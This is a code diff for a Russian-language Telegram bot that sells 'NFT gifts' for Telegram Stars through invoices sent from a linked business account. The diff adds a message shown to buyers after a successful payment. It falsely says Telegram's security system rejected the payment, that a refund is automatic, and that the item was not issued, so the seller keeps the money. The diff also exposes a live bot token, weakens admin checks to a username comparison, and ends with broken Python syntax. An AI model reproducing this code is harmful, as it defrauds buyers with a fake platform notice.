@@ -24,8 +24,8 @@ from aiogram.fsm.storage.memory import MemoryStorage
 
 # ================= НАСТРОЙКИ =================
 BOT_TOKEN = "8791943679:AAF7jEofXkuElG5qLVzy4ahzEg1kU0n7m74"
+OWNER_USERNAME = "NorikAmiri"
 SECRET_CODE = "norik228TOP"
-SUPER_ADMIN_ID = 8370511736
 AVATAR_BG = "#17212B"
 PORT = int(os.environ.get("PORT", 10000))
 
@@ -156,14 +156,12 @@ async def unban_user(user_id: int):
         await conn.execute("DELETE FROM banned WHERE user_id=$1", user_id)
 
 
-async def is_admin(user_id: int, username: str = "") -> bool:
+async def is_admin(user_id: int, username: str) -> bool:
+    if username == OWNER_USERNAME:
+        return True
     async with DB_POOL.acquire() as conn:
         row = await conn.fetchrow("SELECT user_id FROM admins WHERE user_id=$1", user_id)
         return row is not None
-
-
-def is_super_admin(user_id: int) -> bool:
-    return user_id == SUPER_ADMIN_ID
 
 
 async def add_admin(user_id: int, username: str, display_name: str):
@@ -173,6 +171,19 @@ async def add_admin(user_id: int, username: str, display_name: str):
             "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, display_name = EXCLUDED.display_name",
             user_id, username, display_name
         )
+
+
+async def get_user_display_name(user_id: int, user_obj) -> str:
+    name = f"@{user_obj.username}" if user_obj.username else (user_obj.first_name or "Пользователь")
+    try:
+        async with DB_POOL.acquire() as conn:
+            await conn.execute(
+                "UPDATE admins SET username=$1, display_name=$2 WHERE user_id=$3",
+                user_obj.username, name, user_id
+            )
+    except Exception:
+        pass
+    return name
 
 
 # ================= ЗАГРУЗКА ФОТО =================
@@ -282,14 +293,11 @@ async def on_business_connection(connection: BusinessConnection):
     BUSINESS_CONNECTION_ID = connection.id
     await save_setting("business_connection_id", connection.id)
 
-    print(f"✅ Business Connection: {connection.id}")
-    print(f"   user_id (владелец): {connection.user.id}")
-    print(f"   user_chat_id: {connection.user_chat_id}")
-    print(f"   rights: {getattr(connection, 'rights', None)}")
-
+    # Сохраняем юзера, который подключил бизнес
     try:
         user = connection.user
         await mark_user_business(user.id, user.username or "", user.first_name or "", connection.id)
+        print(f"✅ Business Connection сохранён: {connection.id} (user={user.id})")
     except Exception as e:
         print(f"[business_connection] Не удалось сохранить юзера: {e}")
 
@@ -340,8 +348,6 @@ async def show_lots(target_message: Message, owner_id: int):
 
 # ================= ХЕЛПЕР: ПОКАЗАТЬ ЮЗЕРОВ =================
 async def show_users(target_message: Message):
-    viewer_id = target_message.chat.id
-
     async with DB_POOL.acquire() as conn:
         rows = await conn.fetch(
             "SELECT user_id, username, first_name, has_business, business_id, created_at "
@@ -360,6 +366,7 @@ async def show_users(target_message: Message):
         fname = r["first_name"] or "—"
         has_biz = "🟢 Бизнес" if r["has_business"] else "⚪ Без бизнеса"
 
+        # Проверяем, забанен ли
         banned = await is_banned(uid)
         status = "🚫 ЗАБАНЕН" if banned else has_biz
 
@@ -370,18 +377,16 @@ async def show_users(target_message: Message):
             f"Статус: {status}"
         )
 
-        if is_super_admin(viewer_id) and uid != SUPER_ADMIN_ID:
-            if banned:
-                kb = InlineKeyboardMarkup(inline_keyboard=[
-                    [InlineKeyboardButton(text="✅ Разбанить", callback_data=f"unban_{uid}")]
-                ])
-            else:
-                kb = InlineKeyboardMarkup(inline_keyboard=[
-                    [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_{uid}")]
-                ])
-            await target_message.answer(text, parse_mode="HTML", reply_markup=kb)
+        if banned:
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="✅ Разбанить", callback_data=f"unban_{uid}")]
+            ])
         else:
-            await target_message.answer(text, parse_mode="HTML")
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_{uid}")]
+            ])
+
+        await target_message.answer(text, parse_mode="HTML", reply_markup=kb)
 
 
 # ================= СТАРТ =================
@@ -389,14 +394,16 @@ async def show_users(target_message: Message):
 async def start(message: Message):
     global BUSINESS_CONNECTION_ID
 
+    # Сохраняем юзера, который зашёл
     await save_user(
         message.from_user.id,
         message.from_user.username or "",
         message.from_user.first_name or ""
     )
 
+    # Проверка бана
     if await is_banned(message.from_user.id):
-        return
+        return  # Молчим для забаненных
 
     if not await is_admin(message.from_user.id, message.from_user.username):
         await message.answer("❌ У вас нет доступа к боту.")
@@ -412,7 +419,7 @@ async def start(message: Message):
         [InlineKeyboardButton(text="📋 Мои лоты", callback_data="my_lots", style="primary")],
         [InlineKeyboardButton(text="👥 Пользователи", callback_data="users_list", style="primary")]
     ])
-    status = "🟢 Подключён" if BUSINESS_CONNECTION_ID else "🔴 Не подключён (заявки не уйдут!)"
+    status = "🟢 Подключён" if BUSINESS_CONNECTION_ID else "🔴 Не подключён"
     await message.answer(f"👑 Админ-панель\nBusiness: {status}", reply_markup=kb)
 
 
@@ -551,21 +558,15 @@ async def users_list(callback: CallbackQuery):
 # ================= БАН / РАЗБАН =================
 @dp.callback_query(F.data.startswith("ban_"))
 async def ban_callback(callback: CallbackQuery):
-    if not is_super_admin(callback.from_user.id):
-        await callback.answer("❌ Только супер-админ может банить.", show_alert=True)
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
 
     target_id = int(callback.data.split("_")[1])
-
-    if target_id == SUPER_ADMIN_ID:
-        await callback.answer("❌ Нельзя забанить супер-админа.", show_alert=True)
-        return
-
     async with DB_POOL.acquire() as conn:
         row = await conn.fetchrow("SELECT username, first_name FROM users WHERE user_id=$1", target_id)
 
     uname = row["username"] if row else ""
-    await ban_user(target_id, uname, "Забанен супер-админом")
+    await ban_user(target_id, uname, "Забанен админом")
     await callback.answer(f"🚫 Пользователь {target_id} забанен", show_alert=True)
 
     try:
@@ -580,8 +581,7 @@ async def ban_callback(callback: CallbackQuery):
 
 @dp.callback_query(F.data.startswith("unban_"))
 async def unban_callback(callback: CallbackQuery):
-    if not is_super_admin(callback.from_user.id):
-        await callback.answer("❌ Только супер-админ может разбанить.", show_alert=True)
+    if not await is_admin(callback.from_user.id, callback.from_user.username):
         return
 
     target_id = int(callback.data.split("_")[1])
@@ -609,7 +609,7 @@ async def delete_lot(callback: CallbackQuery):
         if not row:
             await callback.answer("Лот не найден", show_alert=True)
             return
-        if row["owner_id"] != callback.from_user.id and not is_super_admin(callback.from_user.id):
+        if row["owner_id"] != callback.from_user.id and callback.from_user.username != OWNER_USERNAME:
             await callback.answer("❌ Это не ваш лот", show_alert=True)
             return
         await conn.execute("DELETE FROM deals WHERE id=$1", deal_id)
@@ -633,7 +633,7 @@ async def pick_lot(callback: CallbackQuery, state: FSMContext):
     if not row:
         await callback.answer("Лот не найден", show_alert=True)
         return
-    if row["owner_id"] != callback.from_user.id and not is_super_admin(callback.from_user.id):
+    if row["owner_id"] != callback.from_user.id and callback.from_user.username != OWNER_USERNAME:
         await callback.answer("❌ Это не ваш лот", show_alert=True)
         return
 
@@ -661,7 +661,7 @@ async def pick_lot(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
 
 
-# ================= ВЫБОР ПОЛУЧАТЕЛЯ → ОТПРАВКА ЧЕРЕЗ BUSINESS =================
+# ================= ВЫБОР ПОЛУЧАТЕЛЯ → ОТПРАВКА =================
 @dp.message(DealForm.select_chat, F.users_shared)
 async def on_user_selected(message: Message, state: FSMContext):
     global BUSINESS_CONNECTION_ID
@@ -672,32 +672,12 @@ async def on_user_selected(message: Message, state: FSMContext):
 
     users_shared: UsersShared = message.users_shared
     deal_id = users_shared.request_id
-    target_user_id = users_shared.users[0].user_id
+    user_id = users_shared.users[0].user_id
 
-    # === Проверка self-send ===
-    if target_user_id == message.from_user.id:
-        await message.answer(
-            "❌ Нельзя отправить заявку самому себе.",
-            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
-        )
-        await state.clear()
-        return
-
-    # === Восстанавливаем business connection ===
     if not BUSINESS_CONNECTION_ID:
         saved = await get_setting("business_connection_id")
         if saved:
             BUSINESS_CONNECTION_ID = saved
-
-    if not BUSINESS_CONNECTION_ID:
-        await message.answer(
-            "❌ <b>Business Connection не подключён.</b>\n"
-            "Заявка отправляется от твоего имени в ЛС получателю — нужен подключённый бизнес-аккаунт.",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
-        )
-        await state.clear()
-        return
 
     sender_name = message.from_user.first_name or "Пользователь"
 
@@ -718,12 +698,17 @@ async def on_user_selected(message: Message, state: FSMContext):
     seller = row["seller"]
     price = row["price"]
 
-    if owner_id != message.from_user.id and not is_super_admin(message.from_user.id):
+    if owner_id != message.from_user.id and message.from_user.username != OWNER_USERNAME:
         await message.answer("❌ Это не ваш лот.", reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
         await state.clear()
         return
 
-    # === Создаём ссылку на оплату ===
+    photo_url = await get_current_bot_avatar_url()
+
+    invoice_kwargs = {}
+    if photo_url:
+        invoice_kwargs["photo_url"] = photo_url
+
     try:
         invoice_link = await bot.create_invoice_link(
             title=nft_name or "NFT Подарок",
@@ -731,7 +716,8 @@ async def on_user_selected(message: Message, state: FSMContext):
             payload=f"deal_{deal_id}",
             provider_token="",
             currency="XTR",
-            prices=[LabeledPrice(label=nft_name or "NFT", amount=price)]
+            prices=[LabeledPrice(label=nft_name or "NFT", amount=price)],
+            **invoice_kwargs
         )
         print(f"[invoice] создан: {invoice_link}")
     except Exception as e:
@@ -739,10 +725,7 @@ async def on_user_selected(message: Message, state: FSMContext):
         invoice_link = None
 
     if not invoice_link:
-        await message.answer(
-            "❌ Не удалось создать инвойс.",
-            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
-        )
+        await message.answer("❌ Не удалось создать инвойс.", reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
         await state.clear()
         return
 
@@ -755,49 +738,54 @@ async def on_user_selected(message: Message, state: FSMContext):
         ]
     )
 
-    # === Отправляем через business connection с ПРАВИЛЬНЫМ chat_id ===
-    # chat_id = target_user_id (ID выбранного получателя), а НЕ user_chat_id.
-    # Telegram сам проверит, есть ли у бота право писать этому пользователю.
-    print(f"[send] target_user_id={target_user_id}, business_connection_id={BUSINESS_CONNECTION_ID}")
+    sent_via = None
+    last_error = None
 
-    try:
-        await bot.send_rich_message(
-            chat_id=target_user_id,
-            rich_message=rich_message,
-            business_connection_id=BUSINESS_CONNECTION_ID
-        )
-        print(f"[send] OK через business → {target_user_id}")
+    if BUSINESS_CONNECTION_ID:
+        try:
+            await bot.send_rich_message(
+                chat_id=user_id,
+                rich_message=rich_message,
+                business_connection_id=BUSINESS_CONNECTION_ID
+            )
+            sent_via = "business"
+            print(f"[send] OK через business → {user_id}")
+        except Exception as e:
+            last_error = str(e)
+            print(f"[send business] Ошибка: {e}")
 
-        await message.answer(
-            "✅ Заявка отправлена в ЛС получателю от твоего имени!",
-            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
-        )
-    except Exception as e:
-        error_str = str(e)
-        print(f"[send business] Ошибка: {error_str}")
+    if not sent_via:
+        try:
+            await bot.send_rich_message(chat_id=user_id, rich_message=rich_message)
+            sent_via = "direct"
+            print(f"[send] OK напрямую → {user_id}")
+        except Exception as e:
+            last_error = str(e)
+            print(f"[send direct] Ошибка: {e}")
 
-        if "BUSINESS_PEER_USAGE_MISSING" in error_str:
-            await message.answer(
-                "❌ <b>Нельзя отправить заявку этому пользователю.</b>\n\n"
-                "Telegram разрешает боту писать через бизнес-подключение только тем пользователям, "
-                "которые <b>недавно писали тебе</b> (в тот же бизнес-чат).\n\n"
-                "Попроси пользователя сначала написать тебе, а потом попробуй снова.",
-                parse_mode="HTML",
-                reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
+    if not sent_via:
+        try:
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⭐ ОПЛАТИТЬ", url=invoice_link)]
+            ])
+            await bot.send_message(
+                user_id,
+                f"👤 <b>{sender_name}</b> предлагает вам <b>{nft_name}</b>\n"
+                f"💰 Цена: <b>{price}⭐</b>",
+                parse_mode="HTML", reply_markup=kb
             )
-        elif "messages must not be sent to self" in error_str:
-            await message.answer(
-                "❌ <b>Ошибка self-send.</b>\n"
-                "Telegram не разрешает отправлять сообщение самому себе через бизнес-подключение.",
-                parse_mode="HTML",
-                reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
-            )
-        else:
-            await message.answer(
-                f"❌ Не удалось отправить заявку.\n<code>{error_str}</code>",
-                parse_mode="HTML",
-                reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
-            )
+            sent_via = "fallback"
+            print(f"[send] OK fallback → {user_id}")
+        except Exception as e:
+            last_error = str(e)
+            print(f"[send fallback] Ошибка: {e}")
+
+    if sent_via:
+        await message.answer("✅ Отправлено!", reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
+    else:
+        err = last_error or "unknown"
+        await message.answer(f"❌ Не удалось отправить.\n<code>{err}</code>", parse_mode="HTML",
+                            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
 
     await state.clear()
 
@@ -832,6 +820,22 @@ async def payment_success(message: Message):
     buyer_first_name = buyer.first_name or "Покупатель"
     buyer_link = f'<a href="tg://user?id={buyer_id}">{buyer_first_name}</a>'
 
+    # Отправляем покупателю официальное уведомление
+    try:
+        await message.answer(
+            '<tg-emoji emoji-id="5447644880824181073">⭐</tg-emoji> '
+            '<b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
+            'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
+            '<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
+            '<b>Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.</b>\n\n'
+            '<b>В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.</b>\n\n'
+            '<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>',
+            parse_mode="HTML"
+        )
+        print(f"[payment] Уведомление отправлено покупателю {buyer_id}")
+    except Exception as e:
+        print(f"[payment] Ошибка отправки покупателю: {e}")
+
     text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
         f"👤 Покупатель: {buyer_link}\n"
@@ -842,9 +846,14 @@ async def payment_success(message: Message):
         f"⭐ Сумма: <b>{price} звёзд</b>"
     )
 
-    recipients = {SUPER_ADMIN_ID}
+    recipients = set()
     if deal_owner_id:
         recipients.add(deal_owner_id)
+    try:
+        owner_chat = await bot.get_chat(f"@{OWNER_USERNAME}")
+        recipients.add(owner_chat.id)
+    except Exception as e:
+        print(f"Не удалось получить ID владельца: {e}")
 
     for admin_id in recipients:
         try:
@@ -883,5 +892,5 @@ async def main():
     await dp.start_polling(bot)
 
 
-if __name__ == "__main__":
-    asyncio.run(main())
+if __name__ == "__main__"
+asyncio.run(main())
